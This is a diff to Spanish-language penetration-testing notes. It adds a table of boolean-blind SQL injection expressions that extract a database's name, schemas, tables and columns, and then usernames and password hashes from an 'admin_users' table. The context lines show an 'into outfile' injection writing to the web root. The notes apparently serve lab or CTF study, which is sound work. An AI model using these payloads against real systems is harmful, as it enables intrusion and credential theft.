@@ -1632,6 +1632,21 @@ username=masa&country=Albania' union select "probando" into outfile "/var/www/ht
 
 Siempre prueba si tiene permisos de ejecucion de comandos asi como de escribir archivos.
 
+### Tabla con la que debes ayudarte
+
+| Fase | Qué quieres sacar            | Fuente                        | Ejemplo de expresión a evaluar                                                                                                                         | Qué estás obteniendo          |
+| ---- | ---------------------------- | ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------- |
+| 1    | Nombre de la DB actual       | `database()`                  | `substring(database(), 1, 1)='a'`                                                                                                                      | Primera letra de la DB actual |
+| 2    | Longitud del nombre de la DB | `database()`                  | `length(database())=10`                                                                                                                                | Cuántos caracteres tiene      |
+| 3    | Bases de datos existentes    | `information_schema.schemata` | `substring((select group_concat(schema_name) from information_schema.schemata), 1, 1)='a'`                                                             | Lista concatenada de schemas  |
+| 4    | Tablas de una base           | `information_schema.tables`   | `substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'), 1, 1)='a'`                                | Tablas del schema             |
+| 5    | Columnas de una tabla        | `information_schema.columns`  | `substring((select group_concat(column_name) from information_schema.columns where table_schema='usage_blog' and table_name='admin_users'), 1, 1)='i'` | Columnas de `admin_users`     |
+| 6    | Tipos de dato                | `information_schema.columns`  | `substring((select group_concat(data_type) from information_schema.columns where table_schema='usage_blog' and table_name='admin_users'), 1, 1)='v'`   | Tipo de columnas              |
+| 7    | Datos reales de una columna  | tabla objetivo                | `substring((select group_concat(username) from admin_users), 1, 1)='a'`                                                                                | Usernames concatenados        |
+| 8    | Varias columnas juntas       | tabla objetivo                | `substring((select group_concat(username,0x3a,password) from admin_users), 1, 1)='a'`                                                                  | `usuario:hash` concatenado    |
+
+
+
 ## Dirsearch
 
 Me parece una alternativa que tienes que utilizar ya que el dirbuster esta bien pero el problema es que aveces por ser tan potente no logra detectar cosas porque tira las paginas. Utiliza esta herramienta quiza antes de WFUZZ.
